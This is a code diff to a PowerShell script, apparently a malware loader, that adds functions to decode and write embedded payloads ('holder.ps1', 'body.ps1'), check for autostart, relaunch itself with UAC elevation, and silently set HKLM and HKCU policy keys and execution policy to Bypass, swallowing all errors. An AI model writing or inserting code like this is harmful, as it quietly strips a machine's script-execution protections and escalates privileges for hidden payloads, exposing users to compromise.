@@ -61,10 +61,19 @@ function Get-HephaestusFolder {
 
 function Get-HephaestusPath {
     $HephaestusFolder = Get-HephaestusFolder
-    $scriptName = 'Hephaestus' + '.' + 'ps1'
+    $scriptName = 'holder' + '.' + 'ps1'
     $HephaestusPath = Join-Path $HephaestusFolder $scriptName
     return $HephaestusPath
 }
+
+function Get-BodyPath {
+    $HephaestusFolder = Get-HephaestusFolder
+    $scriptName = 'body' + '.' + 'ps1'
+    $HephaestusPath = Join-Path $HephaestusFolder $scriptName
+    return $HephaestusPath
+}
+
+
 
 function ExtractEmbedding {
     param (
@@ -75,34 +84,93 @@ function ExtractEmbedding {
     [System.IO.File]::WriteAllBytes($outFile, $decodedBytes)
 }
 
-$scriptArgs = $args
-function Test-Autostart 
-{
-    $argString = $scriptArgs -join ' '
-    if ($argString -like "*autostart*")
+function Test-Arg{ param ([string]$arg)
+    $srcArgs = $MyInvocation.BoundParameters.GetEnumerator() | ForEach-Object { "-$($_.Key) `"$($_.Value)`"" }
+    $srcArgs += $MyInvocation.UnboundArguments
+    $argString = $srcArgs -join ' '
+    if ($argString -like "*$arg*")
     {
         return $true;
     }
     return $false
+} 
+
+function Test-Autostart 
+{
+    return Test-Arg -arg "autostart"
 }
 function Test-Gui
 {
-    $argString = $scriptArgs -join ' '
-    if ($argString -like "*guimode*")
-    {
-        return $true;
+    return Test-Arg -arg "guimode"
+}
+
+function ReRun {
+    param ([string]$arg, [bool]$uac)
+    $localArguments = $MyInvocation.BoundParameters.GetEnumerator() | ForEach-Object { "-$($_.Key) `"$($_.Value)`"" }
+    $localArguments += $MyInvocation.UnboundArguments
+    if (-not [string]::IsNullOrEmpty($string)) {
+        $localArguments += "-$arg"
     }
-    return $false
+    $localArgumentList = @("-File", $MyInvocation.MyCommand.Path) + $localArguments
+    if ($uac -eq $true)
+    {
+        Start-Process powershell.exe -ArgumentList $localArgumentList -Verb RunAs
+    }
+    else {
+        Start-Process powershell.exe -ArgumentList $localArgumentList
+    }
+    exit
 }
 
 
-writedbg "-------------------"
-if (Test-Autostart -eq $true)
-{
-    writedbg "AutoStart"
-    Start-Sleep -Seconds 5
+function Elevate()
+{ 
+  if (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator))
+  {
+      ReRun -arg "" -uac $true
+      exit
+  }
+
+  try {
+    $registryPath = "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell"
+
+  if (-not (Test-Path $registryPath)) {
+      New-Item -Path $registryPath -Force
+  }
+  Set-ItemProperty -Path $registryPath -Name "EnableScripts" -Value 1 -Type DWord
+  Set-ItemProperty -Path $registryPath -Name "ExecutionPolicy" -Value "Bypass" -Type String
+  Write-Host "Registry values have been set successfully."
+  }
+  catch {
+
+  }
+
+  try {
+    $registryPath = "HKCU:\SOFTWARE\Policies\Microsoft\Windows\PowerShell"
+
+  if (-not (Test-Path $registryPath)) {
+      New-Item -Path $registryPath -Force
+  }
+  Set-ItemProperty -Path $registryPath -Name "EnableScripts" -Value 1 -Type DWord
+  Set-ItemProperty -Path $registryPath -Name "ExecutionPolicy" -Value "Bypass" -Type String
+  Write-Host "Registry values have been set successfully."
+  }
+  catch {
+
+  }
+
+  try {
+    Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Bypass -Force;
+  }
+  catch { 
+  }
+
+  try {
+    Set-ExecutionPolicy -Scope LocalMachine -ExecutionPolicy Bypass -Force;
+  }
+  catch {
+  }
 }
-writedbg "-------------------"
 
 function Get-EnvPaths {
     $a = Get-LocalAppDataPath
